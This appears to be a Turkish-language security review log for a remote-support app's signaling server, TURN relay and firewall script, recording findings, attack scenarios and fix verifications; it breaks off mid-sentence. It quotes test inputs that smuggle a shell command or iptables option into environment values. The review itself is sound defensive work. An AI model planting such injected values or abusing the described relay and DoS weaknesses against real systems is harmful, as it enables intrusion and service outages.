  entropi), allowlist eklemeye gerek yok. Not: mutlak yolla (`/repo/...`) taranırsa mevcut allowlist'teki
  `^apps/server/test/helpers/app\.ts$` eşleşmiyor ve 1 bulgu çıkıyor. CI `git` modunda göreli yol kullandığı için
  sorun değil.
- `caddy adapt`: header işlemleri yukarıdaki gibi doğrulandı (set / delete, trusted_proxies yok).

## P2 Tur 3
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 0. Kapanan: S-P2-T2-1 (a + b) ve `server-only` bilgi notu.
Açık kalan (kapsam gereği, değişmedi): S-P2-4 (P3), S-P2-5 (P3 öncesi staging) ve P3 giriş şartları.

### Düzeltme doğrulaması
- **S-P2-T2-1 (a) web açılış kontrolü: kapandı.** `apps/web/instrumentation.ts:6-10` yalnız `NEXT_RUNTIME=nodejs` ve
  `NODE_ENV=production` koşulunda `lib/startup-check.ts`'i dinamik olarak import ediyor. `assertEdgeSecretOrExit()`
  (startup-check.ts:9-16) `readEdgeSecret()` hata verirse yalnız hata mesajını yazıp `process.exit(1)` çağırıyor. Mesaj
  sabit metin (`edge-forward.ts:34`: "EDGE_PROXY_SECRET gerekli (>= N karakter …)"), yani sır değeri ve uzunluğu
  loglanmıyor. İmaj (`apps/web/Dockerfile:27`) ve compose (`docker-compose.yml:106`) `NODE_ENV=production` veriyor,
  dolayısıyla kontrol staging/prod'da devrede.
  Edge sızıntısı yok: `.next/server/edge/chunks/_1wcossgycoscr._.js` içinde `register` boş bir fonksiyona derlenmiş
  (`async function t(){}`). `startup-check`, `process.exit` ve hata metni edge veya `static` paketlerinde yok; yalnız Node
  sunucu chunk'ında bulunuyor. Sınır: Caddy ile web'de iki farklı geçerli sır olması açılışta yakalanamaz; bu durumu (b)
  kapatıyor.
- **S-P2-T2-1 (b) server alarmı: kapandı.** `ClientIpIsProxyAlarm` (public.ts:79-97) `resolvePublicSession`'ın ilk
  satırında çağrılıyor (public.ts:150), yani token ve kod yollarının ikisinde de çalışıyor.
  - İstek engellenmiyor: `check()` hiçbir şey döndürmüyor ve fırlatmıyor.
  - Log satırı: `app.log` (istek logger'ı değil) ile yazılan `{alarm:"client_ip_is_proxy"}` + sabit mesaj. IP, token,
    reqId ve url yok. Entegrasyon testi (sessions-public.test.ts:172-196) IP'lerin ve token'ın logda olmadığını
    doğruluyor.
  - DoS/bellek: throttle `FixedWindowCounter(1, 60s, 60s, sweepIntervalMs:0)` ve tek sabit anahtar `"proxy"`
    kullanıyor; en çok 1 kayıt tutuyor, zamanlayıcı yok (bu yüzden `closePublicLimits`'te kapatılmaması sızıntı
    oluşturmuyor). Maliyet O(1). Alarm dakikada en çok 1 warn üretiyor. Dışarıdan bir istemci tetikleyemiyor, çünkü
    Caddy XFF'i her zaman yeniden yazıyor ve dış istemcinin IP'si 172.30.0.2/31 içinde olamıyor.
- **`cidrMatcher` (ip.ts:37-49): doğru.** `node:net` `BlockList` ile denendi (`172.30.0.2/31` ve `fd00:30::/64`):
  | Girdi | Sonuç |
  |---|---|
  | `.2` / `.3` / `.4` | true / true / false |
  | `::ffff:172.30.0.3`, `::FFFF:…`, `0:0:0:0:0:ffff:172.30.0.3`, `::ffff:ac1e:3` | true (eşlemeli IPv6 yakalanıyor) |
  | `172.30.0.3%eth0`, `fd00:30::1%lo` | true (zone id atılıyor) |
  | `""`, `garbage`, `1.2.3.4/32`, `::1` | false (fırlatmıyor) |
  | IPv6 CIDR'a karşı IPv4 / eşlemeli adres | false |
  | `cidr` `undefined` veya `""` | her zaman false |

  Geçersiz CIDR'da `addSubnet` fırlatır, ama `env.ts:7-12` biçimi ve prefix üst sınırını (≤32 / ≤128) açılışta
  doğruluyor; production'da CIDR zorunlu (env.ts:33). Hata kapalı yönde çalışıyor: eşleşme yoksa sonuç yalnız
  "alarm yok" oluyor.
- **`server-only`: kapandı.** `apps/web/lib/server-api.ts:1` içinde `import "server-only"` var. Next'in kendi derlenmiş
  kopyasına yönlendiriliyor, yeni bağımlılık eklenmemiş.

### Bulgular
Yok.

### Otomatik tarama / test (Tur 3)
- `vitest run test/unit/{ip,resolve-alarm,env-logger}.test.ts` (server): 3 dosya, **13/13 geçti**.
- Build çıktısı taraması (edge/static chunk'larında `startup-check` / `process.exit` / hata metni): **yok**.
- Bağımlılık değişmediği için `pnpm audit` ve gitleaks Tur 2 sonuçları geçerli.

---

## P3 kod turu
DURUM: DÜZELTİLMELİ
Özet: Kritik 0 / Yüksek 1 / Orta 1 / Düşük 7. Tek Yüksek bulgu bağımlılık sürümünden geliyor, düzeltmesi tek satır.
Protokol ve oda mantığında Kritik/Yüksek bulgu yok.

### Bulgular (öncelik sırasıyla)

#### S-P3-1 [YÜKSEK] `ws` 8.18.3: küçük parçalı çerçevelerle bellek tüketme DoS (GHSA-96hv-2xvq-fx4p) — A06 Vulnerable Components
Yer: apps/server/package.json (`ws`), kilit `ws@8.18.3`; apps/server/src/signaling/ws.ts:54 (`maxPayload: 1024 * 1024`)
Sorun: `pnpm audit` Yüksek: ws <8.21.0'da çok sayıda küçük fragment/veri parçası sunucu belleğini tüketiyor. Ayrıca Orta
(GHSA-58qx-3vcg-4xpx, <8.20.1, ilklenmemiş bellek ifşası).
Senaryo: Oturum kodunu bilen biri (müşteri tarafı ya da kodu ele geçiren kişi) resolve → join ile ticket alıyor ve
**admit beklemeden** lobi WS'ine bağlanıyor. Ardından tek mesajı binlerce küçük fragmana bölerek gönderiyor. Mesaj
tamamlanmadığı için 64 KB/50 msg/sn kontrolleri (handlers.ts:41-43) hiç devreye girmiyor. Tek instance (ADR-0005)
OOM olursa tüm tenant'ların aktif oturumları düşer. Kimliği doğrulanmış her teknisyen de aynı saldırıyı yapabilir.
Düzeltme (backend-dev): `ws` ≥ 8.21.0 sürümüne geçilmeli, `pnpm install` ile kilit güncellenmeli ve `pnpm audit`
temiz çıkmalı. Ek önlem: `maxPayload` değeri `WS_MAX_PAYLOAD` (64 KB) ile eşitlenmeli. 64 KB üstü 1009 ile kapanır,
AC-17 testi buna göre güncellenir (implementation.md P3 madde 6). Böylece bağlantı başına tampon 16 kat küçülür.

#### S-P3-2 [ORTA] coturn `allowed-peer-ip=<public IP>` TURN host'unun tüm UDP portlarını relay'e açıyor — A05/A10 (SSRF benzeri)
Yer: deploy/turn/entrypoint.sh:56-57; deploy/turn/docker-compose.yml:15 (`network_mode: host`)
Sorun: relay↔relay için TURN'ün kendi public IP'si izin listesine alınmış. coturn'de `allowed-peer-ip` port ayırmıyor,
bu yüzden yalnız 49160-49199 değil o IP'deki **her UDP portu** relay edilebiliyor. Staging'de TURN, publish
sunucusunun (185.126.217.99, başka servisler de çalışıyor) host ağında. Relay'in kendi IP'sine gönderdiği paket
loopback üzerinden döndüğü için UFW'nin dış kurallarını atlıyor.
Senaryo: Admit edilen misafir (ya da credential'ı ele geçiren biri) TURN credential'ıyla allocation açıyor ve peer
olarak `185.126.217.99:<udp port>` veriyor. Böylece host'ta 0.0.0.0'a bağlı, dışarıya kapalı UDP servislerine (DNS,
VPN, SNMP, syslog vb.) ulaşıyor. coturn'ün kendi 3478'ine relay ederek TURN-in-TURN zinciri de kurabiliyor.
`no-tcp-relay` riski UDP ile sınırlıyor.
Düzeltme (devops): Host'ta OUTPUT kuralı eklenmeli: kaynak portu 49160:49199 olan ve hedefi `$PUBLIC_IP` olan UDP
paketlerinde hedef port 49160:49199 değilse DROP (iptables/nftables, runbook §9). `test-denied.sh`'e iki negatif test
eklenmeli: `$PUBLIC_IP:3478` ve `$PUBLIC_IP:53` relay edilememeli. Staging'de `ss -ulnp` çıktısı runbook'a
yazılmalı. Prod'da ayrı VM planı (ADR-0007) korunmalı.

#### S-P3-3 [DÜŞÜK] IPv6 relay sınırsız: `relay-ip`/`listening-ip` verilmemiş
Yer: deploy/turn/turnserver.base.conf:4-19, 39-52; entrypoint.sh:49
Sorun: Host'un global IPv6'sı varsa coturn IPv6 relay açabilir (REQUESTED-ADDRESS-FAMILY). Host'un kendi IPv6
adresi ve sağlayıcının IPv6 komşuları denied listesinde yok. IPv4'teki sağlayıcı bloğu engelinin IPv6 karşılığı da yok.
Düzeltme (devops): Entrypoint, `TURN_EXTERNAL_IP`'nin private kısmından `relay-ip=<private v4>` (gerekirse
`listening-ip`) üretmeli. Alternatif olarak host'un IPv6 /64'ü local listeye eklenmeli. `test-denied.sh`'e IPv6
allocation denemesi eklenmeli.

#### S-P3-4 [DÜŞÜK] Süresi dolan PENDING oturum odaya bildirilmiyor; bazı odalar bellekten hiç silinmiyor
Yer: apps/server/src/sessions/service.ts:137-145 (expire yolu `closeSession` çağırmıyor); rooms.ts:121
(`rejectedIps.size === 0 && admitFails === 0` şartı)
Sorun: EXPIRED olan oturumda teknisyen WS'i ve lobi misafirleri açık kalıyor (lobi en fazla 5 dk). Ret veya hatalı
kod görmüş bir oda, teknisyen ayrıldıktan sonra süreç yeniden başlayana kadar bellekte duruyor. Oda üretmek kimlik
doğrulaması gerektirdiği için etkisi yavaş bir sızıntı.
Düzeltme (backend-dev): Expiry işi başarılı `expireOne` sonrası `rooms.closeSession(id, "timeout")` çağırmalı;
`RoomNotifier` tipine `"timeout"` eklenmeli. `dropRoomIfIdle` yalnız PENDING süresi geçmiş odaları ret listesiyle
birlikte silebilir.

#### S-P3-5 [DÜŞÜK] CI gitleaks (git modu) yeni P3 test dosyalarında kırılacak
Yer: .gitleaks.toml:8-11 (allowlist yalnız `apps/server/test/helpers/app.ts`). Yerel dir taramasında `generic-api-key`
veren dosyalar: apps/server/test/helpers/ws.ts:56, test/integration/signaling-lifecycle.test.ts:15,
test/unit/signaling.test.ts:12 ve :67. Değerlerin hepsi sahte TURN secret'ı.
Düzeltme (backend-dev): Bu yollar allowlist'e eklenmeli ya da satırlara `// gitleaks:allow` yazılmalı. Commit
öncesinde git modunda yeniden taranmalı. Not: allowlist regex'i `^apps/...` ile başladığı için dir modunda
(`/repo/apps/...`) eşleşmiyor; yerel kontrol için `(^|/)apps/...` biçimi önerilir.

#### S-P3-6 [DÜŞÜK] TURN credential oturum bittikten sonra 60 dakikaya kadar geçerli
Yer: apps/server/src/signaling/turn.ts:29; env.ts:35 (`TURN_CRED_TTL_MIN` varsayılan 60)
Sorun: Admin terminate, ret veya müşterinin bitirmesi credential'ı iptal etmiyor (`use-auth-secret` yapısı gereği).
Eski misafir relay'i internete yönelik bant genişliği için kullanmaya devam edebilir (8 Mbps ve user-quota=8 ile
sınırlı).
Düzeltme (devops/backend-dev): Varsayılan 15-20 dk yapılmalı. Yenileme mekanizması (`ice.servers`, active.ts:48-60)
zaten var, ek maliyeti yok.

#### S-P3-7 [DÜŞÜK] `/ws/tech` upgrade'inde oran sınırı yok
Yer: apps/server/src/signaling/ws.ts:80-91
Sorun: Origin başlığı tarayıcı dışından taklit edilebilir. Her rastgele çerezli istek `resolveSession` ve
`findForSignal` ile DB'ye gidiyor; misafir yolundaki `guestIp` (31/dk) sınırının teknisyen yolunda karşılığı yok.
Düzeltme (backend-dev): Aynı `FixedWindowCounter` IP başına teknisyen yoluna da uygulanmalı.

#### S-P3-8 [DÜŞÜK] WS yeniden doğrulaması yetki daraltmasını yansıtmıyor; `endByTechnician` hiç çağrılmıyor
Yer: apps/server/src/signaling/ws.ts:176-183; rooms.ts:208-211
Sorun: 60 sn'lik kontrol yalnız oturum/kullanıcı/tenant geçerliliğine bakıyor. `remote_control.use`/`file_transfer.use`
geri alınsa da `room.caps` admit anındaki haliyle kalıyor. AC-115 için yazılan `endByTechnician` hiçbir yerden
çağrılmıyor. P3'te caps henüz bir işlem açmadığı için şimdilik etkisi yok.
Düzeltme (backend-dev): P7 giriş şartı. Yetki/rol değişikliği ve deaktivasyon servisleri `rooms.endByTechnician`
çağırmalı ya da yeniden doğrulama sırasında `permissions` tazelenip caps daralırsa oda bitirilmeli.

#### S-P3-9 [DÜŞÜK] coturn stdout logunda müşteri/peer IP'leri ve kullanıcı adı (sessionId) var
Yer: deploy/turn/turnserver.base.conf:17-18; docker-compose.yml:45-47 (json-file 5×10 MB, saklama süresi tanımsız)
Düzeltme (devops): Runbook'a log saklama süresi (KVKK) yazılmalı. Gerekmiyorsa log seviyesi düşürülmeli. Secret
logda görünmüyor (yalnız `TURN_CONFIG_CHECK` çıktısı var, o da maskeli).

### Doğrulanacak (çalışma zamanı, devops)
- coturn CLI (5766/tcp) kapalı mı: staging'de `ss -tlnp | grep -E '5766|9641'` çalıştırılmalı. 9641 yalnız
  127.0.0.1'de olmalı, 5766 hiç görünmemeli. Kod tarafında `--cli` verilmiyor; 4.18 varsayılanına güveniliyor.

### Otomatik tarama çıktıları
- `pnpm audit --audit-level=moderate`: **2 açık**. Yüksek 1: ws GHSA-96hv-2xvq-fx4p. Orta 1: ws GHSA-58qx-3vcg-4xpx.
  Yol: `apps/server > ws@8.18.3`. → S-P3-1.
- gitleaks v8.30.1 (docker, dir modu, `.gitleaks.toml`): 15 eşleşme, hepsi `generic-api-key`.
  - 10'u `apps/web/.next/**` derleme çıktısı (git-ignore, repoya girmiyor; Next preview anahtarı derleme başına üretiliyor).
  - 5'i sahte test değeri: test/helpers/app.ts:13 (allowlist'te ama dir modunda eşleşmiyor) ve S-P3-5'teki 4 satır.
  - Gerçek gizli bilgi bulunmadı.
- `deploy/turn/certs/` ve `*.key` git-ignore'da; repoda anahtar dosyası yok. `denied-peer-ip.local.conf` repoda yok,
  yalnız `.example` (RFC 5737 belgeleme IP'leri) var.

### Tasarımda vaat edilip kodda bulunmayanlar
- mimari §5.1 LobbyGuest "admitCodeHash (SHA-256 + oturum tuzu)": tuz olarak guestId (ULID) kullanılıyor. Hash yalnız
  bellekte tutulduğu ve kodu teknisyen girdiği için risk yok, yalnız kayda geçsin.
- AC-115 `endByTechnician` bağlantısı → S-P3-8 (P7/P9).
- P2 "P3 giriş şartları": madde 2 (atomik tüketim) karşılandı (repo.ts:145-151 koşullu `updateMany` + 5 CHECK + bellek
  `admitting` bayrağı). Madde 3 ADR-0012 ile karşılandı (`publicClientAllowed`). Madde 1 (`/public/agent/download?ref=`
  limiti) P6'ya kaldı.

### Olumlu
- WS kimlik: misafir yolunda sorgu dizesi 403 (ws.ts:103); credential yalnız `Sec-WebSocket-Protocol` üzerinden
  geliyor; `rs.v1` zorunlu ve tam bir credential bekleniyor; 43 karakterlik base64url regex var. Ticket ve nonce
  256 bit CSPRNG, depoda SHA-256 ile tutuluyor; `take` kontrolü ve silmeyi aynı senkron adımda yapıyor (yarış yok)
  ve depo 20k kayıtla sınırlı. Teknisyen yolunda Origin allowlist + çerez + `mustChangePassword` + **yalnız oturum
  sahibi** kontrolü var.
- Join: istemci türü (kind) istemcinin beyanından değil nonce kaydından alınıyor; IP limiti nonce tüketiminden önce
  uygulanıyor; durum yalnız okunuyor, tüketim admit'te.
- Admit: koşullu `updateMany` (PENDING ∧ expires>now ∧ consumed_at NULL) ve audit aynı TX'te; `room.admitting`
  bayrağı kontrolle aynı senkron adımda set ediliyor; 4 haneli kod `safeEqual` ile karşılaştırılıyor; lobi
  kodları tekil; 5. hatada lobi boşaltılıyor; ret listesi ipKey ile tutuluyor.
- Oda izolasyonu: oda upgrade anında bağlantıya bağlanıyor; relay alanları yeniden kuruluyor (gelen nesne olduğu
  gibi aktarılmıyor); strict zod, 64 KB sınırı, 50/sn token-bucket, ikili çerçeve reddi var. Lobi misafirinden SDP/ICE
  gelirse bağlantı 1008 ile kapanıyor. iceServers/TURN credential yalnız admit sonrası veriliyor (teknisyene de).
- Reconnect token her hello'da yenileniyor ve eskisi siliniyor. Bağlıyken ikinci bağlantı 403 alıyor ve audit'e
  yazılıyor. Teardown token'ı da temizliyor.
- Terminate: `sessions.terminate` yetkisi + tenant kapsamlı `updateMany` var; başka tenant'ın oturumu 404 dönüyor;
  audit yazılıyor.
- TURN: secret komut satırında yok (tmpfs'de 0600 yetkili config, umask 077); `TURN_CONFIG_CHECK` çıktısı maskeli;
  fail-closed doğrulama var (local liste zorunlu, satır biçimi denetleniyor). denied-peer-ip; 192.168.25.0/24 ve
  172.30.0.0/24'ü (192.168/16 ve 172.16/12 içinde), 169.254.169.254'ü, loopback'i, ::ffff eşlemeli adresleri ve
  6to4/Teredo/ULA aralıklarını kapsıyor. `no-tcp-relay`, quota ve max-bps tanımlı; Prometheus 127.0.0.1'de; imaj
  digest ile sabit; konteyner read_only, cap_drop ALL ve nobody kullanıcısıyla çalışıyor. CI'da denied-peer-ip
  negatif testleri var.
- /metrics: token yoksa 404, karşılaştırma `safeEqual` ile; etiketler sabit kümeden (IP/oturum/kod yok); Caddy
  dışarıya 404 dönüyor. Loglarda yalnız ret nedeni var; ticket/token/SDP/ICE loglanmıyor. Caddy logu sorgu dizesini,
  çerezi ve subprotocol'ü siliyor.

### Öneri: `docs/gereksinimler.md` §9 "Sonra"
S-P3-3, S-P3-4, S-P3-6, S-P3-7, S-P3-9. S-P3-8 P7 giriş şartı olarak işlenmeli. S-P3-1 bu pakette kapanmalı.
S-P3-2 staging'de kapanmalı (TURN publish sunucusunu paylaşıyor). S-P3-5 commit'ten önce kapanmalı.

## P3 Tur 2
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (yeni, sertleştirme) + S-P3-8 (P7 giriş şartı, açık).
"P3 kod turu"ndaki S-P3-1..7 ve S-P3-9 doğrulandı. Yeni Kritik/Yüksek bulgu yok. P3 güvenlik kapısı açık.
Kalan tek şart çalışma zamanı kanıtı: staging'de `host-firewall.sh install` + `test-denied.sh` bölüm 4 + runbook §9.2.3
çıktısı test-raporuna eklenmeli (S-P3-2 kapanışı staging'de ölçülerek yapılır).

### Düzeltme doğrulaması
| Bulgu | Sonuç | Kanıt |
|---|---|---|
| S-P3-1 | KAPANDI | `apps/server/package.json:31` `ws: 8.21.0`, kilitte yalnız `ws@8.21.0`. `pnpm audit`: No known vulnerabilities. `signaling/ws.ts:54` `maxPayload: WS_MAX_PAYLOAD` (64 KB), `perMessageDeflate:false`. `ws.ts:80` soket `error` dinleyicisi (yalnız role+code loglanıyor), `ws.ts:160` upgrade öncesi ham soket `error` → destroy. |
| S-P3-2 | KAPANDI (kod) / staging kanıtı bekleniyor | `deploy/turn/host-firewall.sh`: `REMOTE-TURN-OUT` zinciri; kurallar yalnız `-p udp --sport 49160:49199` ∧ (`-d public` ∨ `-d private` ∨ `addrtype LOCAL`) ∧ `! --dport 49160:49199` → DROP. `print` çıktısı staging girdisiyle doğrulandı (public 185.126.217.99, NAT arkasında yerel olmasa da `-d` kuralıyla kapsanıyor). `test-denied.sh:100-120` aralık içi echo + 3480/3478/53 DROP sayacı. |
| S-P3-3 | KAPANDI | `entrypoint.sh` `relay-ip=$PRIVATE_IP` (is_ipv4 ile doğrulanmış), IPv6 relay 440. |
| S-P3-4 | KAPANDI | `sessions/service.ts:164` başarılı expiry sonrası `closeSession(id,"timeout")`. `rooms.ts:129-145` ret/hata taşıyan boş oda yalnız `expiresAt`'e kadar tutuluyor; `timers.idle` teardown'da (`rooms.ts:216`) temizleniyor. |
| S-P3-5 | KAPANDI | Sahte secret'lar `test/helpers/secrets.ts`'te; `.gitleaks.toml` `(^|/)apps/server/test/helpers/(app|secrets)\.ts$`. gitleaks dir: kaynakta 0 bulgu. |
| S-P3-6 | KAPANDI | `env.ts:35` varsayılan 20, compose `${TURN_CRED_TTL_MIN:-20}`, runbook:183 güncel. |
| S-P3-7 | KAPANDI | `ws.ts:59,87-88` ayrı `techIp` sayacı (31/dk, 60 sn kilit), Origin/çerez/DB kontrolünden önce. IP, güvenilen proxy zinciriyle hesaplanıyor (`clientIp`, XFF taklidi yok). |
| S-P3-9 | KAPANDI | json-file 3×5 MB; runbook §9.8.1 haftalık root cron (girdi `docker inspect`'ten, kullanıcı girdisi yok); entrypoint `cli*/verbose/log-binding` görürse başlamıyor. |
| S-P3-8 | AÇIK (P7 giriş şartı) | Değişmedi. `endByTechnician` testi eklendi ama çağıran uç yok. |

### Paylaşımlı sunucu etkisi (host-firewall.sh) — değerlendirme
- **Zincir kapsamı dar:** OUTPUT'a yalnız tek atlama ekleniyor. Zincirde yalnız DROP var, ACCEPT/RETURN yok. Bu yüzden
  diğer projelerin, UFW'nin (ufw-*) ve Docker'ın (DOCKER-*, nat, FORWARD) kural sırasını ve kararını değiştirmiyor.
  Bridge ağındaki konteyner trafiği OUTPUT'tan geçmiyor (FORWARD/INPUT). Etkilenebilecek tek paket şu: host ağ ad
  alanında 49160-49199'dan çıkan ve host'un kendi adresine aralık dışı porta giden UDP.
- **Reserved ports:** yalnız ephemeral (otomatik) atamayı etkiliyor. Açık `bind` serbest. ~28k'lık havuzdan 40 port
  çıkıyor, etkisi önemsiz. Mevcut liste korunuyor, remove yalnız tam eşleşen `49160-49199` girdisini çıkarıyor.
- **remove/uninstall:** yalnız kendi atlamasını (`-D OUTPUT -j REMOTE-TURN-OUT` döngüsü), kendi zincirini ve sabit adlı
  systemd dosyalarını siliyor. Değişken içeren `rm` yok. Başka zincire `-F/-X` uygulanmıyor.
- **Girdi doğrulama:** IP'ler v4/v6 regex'inden geçiyor, portlar yalnız rakam olabiliyor. `.env` `source` edilmiyor,
  yalnız `TURN_EXTERNAL_IP` satırı sed ile okunuyor. Denendi: `TURN_EXTERNAL_IP='1.2.3.4;id'` ve
  `TURN_FW_SELF_IPS='::1 -j ACCEPT'` → "geçersiz IP" ile durdu.
- **Entrypoint relay-ip:** `${TURN_EXTERNAL_IP#*/}` + `is_ipv4`. Birden fazla `/` reddediliyor. Yanlış IP verilirse
  coturn bind edemiyor ve kapalı kalıyor (fail closed).

### Yeni bulgular
#### S-P3-T2-1 [DÜŞÜK] host-firewall.sh: yarım uygulamada fail-open penceresi, satır tabanlı IP doğrulaması — A05
Yer: deploy/turn/host-firewall.sh:44-45 (`is_v4/is_v6`: `echo | grep -Eq`), :91-99 (`do_apply`: `-F` sonra tek tek `-A`), :63-70 (`reserve_add`)
Sorun:
1. `do_apply` önce zinciri boşaltıyor, sonra kuralları tek tek ekliyor. Bir `-A` hata verirse (ör. regex'ten geçen
   ama geçersiz olan `999.1.1.1` ya da `:::::`) betik `set -e` ile duruyor. OUTPUT atlaması yerinde kalıyor ama zincir
   boş ya da eksik oluyor (fail-open). Timer her 5 dakikada aynı hatayı tekrarlıyor.
2. `grep -Eq` satır bazında eşleştiriyor. Env'den gelen çok satırlı bir değerin yalnız ilk satırının geçerli olması
   yetiyor. Aynı kalıp `entrypoint.sh:15` `is_ipv4`'te de var; orada sonraki satır coturn config'ine yazılıyor
   (ör. `allow-loopback-peers`). Değeri yalnız root/.env sahibi verebildiği için güven sınırı aşılmıyor. Bu bir
   sertleştirme bulgusu.
3. Çekirdek, mevcut bir komşu ya da örtüşen rezervi bizim aralıkla birleştirirse `reserved_ok` (tam satır eşleşmesi)
   kalıcı olarak yanlış dönüyor. Bu durumda `check` sürekli başarısız oluyor, `ensure` her 5 dakikada `-F` ile yeniden
   uyguluyor, `remove` de birleşik aralığı geri alamıyor.
İstismar senaryosu: Doğrudan dış istismar yok. Yönetici hatası ya da beklenmeyen bir çekirdek/modül hatası S-P3-2
korumasını sessizce kaldırabilir.
Düzeltme (devops): Kuralları geçici bir zincirde (`REMOTE-TURN-OUT-NEW`) kurun, başarılı olursa atlamayı değiştirip
eskisini silin. Ya da tek seferde `iptables-restore --noflush` kullanın. IP doğrulamasını `case` kalıbı ve oktet
≤255 kontrolüyle yapın, `[ "$(printf %s "$1" | wc -l)" -eq 0 ]` ile çok satırlı değeri reddedin (entrypoint dahil).
`reserved_ok` için kapsama kontrolü yeterli olmalı (reserve_add'deki awk mantığı); `check` hatasında timer sessizce
döngüye girmemeli, journald'a `err` yazmalı.

#### S-P3-T2-2 [DÜŞÜK] systemd timer, repo klonundaki betiği 5 dakikada bir root olarak çalıştırıyor — A08
Yer: deploy/turn/host-firewall.sh:104-113 (`ExecStart=$SELF_PATH ensure`, `/opt/remote/deploy/turn/host-firewall.sh`)
Sorun: Root, repo çalışma kopyasındaki dosyayı ve aynı dizindeki `.env`/`turnserver.base.conf`'u periyodik olarak
çalıştırıyor/okuyor. `/opt/remote` root dışında bir kullanıcının (deploy/CI kullanıcısı) yazabileceği bir yer
olursa ya da `git pull` ile gelen bir değişiklik incelenmeden alınırsa, kod 5 dakika içinde root olarak çalışır.
Repo açık kaynak olduğu için katkı yolu da bir tedarik zinciri girişi. Bugün staging'e root ile SSH yapılıyor ve
klon root sahipli, bu yüzden risk düşük.
Düzeltme (devops): `install`, betiği `/usr/local/sbin/remote-turn-fw` olarak (root:root 0755) kopyalasın ve gerekli
değerleri (`TURN_EXTERNAL_IP`, aralık) `/etc/default/remote-turn-fw`'ye (root 0600) yazsın. Ya da en azından
`install`/`ensure` betik dizininin sahibini ve yazma izinlerini denetleyip (`stat`; group/other yazabiliyorsa)
reddetsin. Runbook §9.2.1'e "betik güncellenince `install` yeniden çalıştırılır" notu eklenmeli.

### Otomatik tarama çıktıları (Tur 2)
- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found**.
- gitleaks v8.30.1 (docker, dir modu, `.gitleaks.toml`): 10 eşleşme, **hepsi `apps/web/.next/**`** (`.previewinfo`,
  `prerender-manifest.json`, `preview-props.json` ve standalone kopyaları; git-ignore'daki derleme çıktısı, Next
  preview anahtarı). Kaynak/commit edilecek dosyalarda **0**.
- `sh -n host-firewall.sh` temiz; `print` staging girdisiyle beklenen 3+1 kuralı üretiyor.
- Regresyon: server unit **69/69** yeşil (bu turda koşuldu). Entegrasyon 93/93 implementation.md'den alındı, bu turda
  koşulmadı (MySQL gerekli).

### Öneri: `docs/gereksinimler.md` §9 "Sonra"
S-P3-T2-1, S-P3-T2-2 (P13/prod açılışından önce kapanmalı). S-P3-8 → P7 giriş şartı.

## P4 kod turu
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 1 / Düşük 3 (+1 bilgi)

### Bulgular (öncelik sırasıyla)

#### S-P4-1 [ORTA] `ABUSE_EMAIL` deploy'a bağlanmamış → public resolve her zaman Super Admin e-postasını döndürür — A01/A04 (bilgi ifşası)
Yer: `apps/server/src/public/consent.ts:61-65`, `apps/server/src/sessions/service.ts:` resolve dönüşü (`abuseEmail: abuse`);
`deploy/docker-compose.yml` server `environment:` (ABUSE_EMAIL yok), `.env.example` (yok), `docs/runbook.md` (yok).
Sorun: Compose `env_file` kullanmıyor; değişken açıkça verilmediği için `env.ABUSE_EMAIL` prod/staging'de hep boş, fallback
devreye giriyor: ilk aktif Super Admin'in e-postası (= giriş kimliği) her geçerli bağlantı/kod sahibine JSON'da ve
karşılama sayfasında (`guest-welcome.tsx:99-100` mailto) verilir. CLAUDE.md "yeni env → .env.example + compose + runbook" kuralı da ihlal.
İstismar senaryosu: Dolandırıcı kendi tenant'ında (veya ele geçirilmiş teknisyen hesabıyla) bir oturum açıp linki
kendisi açar → platformun en yetkili hesabının giriş e-postasını öğrenir → hedefli oltalama / parola deneme / 2FA
sosyal mühendisliği. V13 kullanıcı kararıdır; risk karar sahibinin bilmesi gereken düzeyde.
Düzeltme: `ABUSE_EMAIL` → `.env.example` (boş) + compose server `environment` + runbook; production'da zorunlu
(`env.ts` refine, SESSION_REF_KEY kalıbı) ve Super Admin fallback'i yalnız development'ta. (atanan: devops + backend-dev)

#### S-P4-2 [DÜŞÜK] `apps/web` devDependency `ws@8.18.3` — GHSA-58qx-3vcg-4xpx (yüksek, DoS) + bellek ifşası (orta) — A06
Yer: `apps/web/package.json:38`. Yalnız e2e mock (`e2e/mock-ws.mjs`) kullanıyor; standalone prod imajına girmez, server `ws@8.21.0` temiz.
Düzeltme: `8.21.0`'a yükselt (CI `pnpm audit` kapısını da yeşillendirir). (atanan: frontend-dev)

#### S-P4-3 [DÜŞÜK] Müşteri adında kontrol/bidi karakteri filtresi yok — A03/A04
Yer: `packages/contracts/src/api/sessions.ts:104` (`trim().min(2).max(100)`).
Sorun: XSS yok (React metin, `dangerouslySetInnerHTML` yok; audit JSON). Ancak `‮`, satır sonu, sıfır genişlikli
karakterle teknisyen lobisinde/audit ekranında yanıltıcı ad ("Destek Ekibi — kodu okuyun") gösterilebilir.
Düzeltme: `\p{Cc}\p{Cf}` (bidi/ZW dahil) reddi veya temizleme; gerekirse `customerEmail` kullanılmıyorsa şemadan çıkar. (atanan: backend-dev)

#### S-P4-4 [DÜŞÜK] Müşteri adı teknisyen sekmesinin sessionStorage'ında çıkışta silinmiyor — A02/KVKK
Yer: `apps/web/lib/webrtc/use-tech-session.ts:13-28,128-133`. Yalnız `phase==="ended"` olunca silinir; sekme açık
kalıp logout yapılırsa veya konsoldan oturum bitmeden ayrılınırsa ad aynı sekmede kalır (paylaşımlı bilgisayar). Etki düşük (sekme kapanınca gider).
Düzeltme: logout'ta `rs.guestName.*` anahtarlarını temizle. (atanan: frontend-dev)

#### S-P4-5 [BİLGİ] Next `/ws` rewrite prod'da etkisiz
`next.config.ts` rewrite yalnız web'e ulaşan istekte çalışır; Caddy `/ws/*`'ı server'a önce yönlendiriyor ve web portu
yayımlanmıyor. Yalnız `/ws` (eğik çizgisiz) web'e düşer → server'da 404. Risk yok; istenirse rewrite `NODE_ENV!=="production"` koşuluna alınabilir.

### Doğrulanan kontroller (odak listesi)
- **KVKK onay bütünlüğü:** `acceptConsent` id + oturumun tenant'ı + `is_current` ile arar (başka tenant/eski sürüm → 400,
  ayırt edilmez); kayıt admit TX'inde `consumeForAdmit`=1 sonrası (count=0 → yazılmaz); bileşik FK
  `(consent_text_id, tenant_id, consent_sha256)` + `CHECK sha256 = SHA2(body,256)` + `app` için UPDATE/DELETE yok →
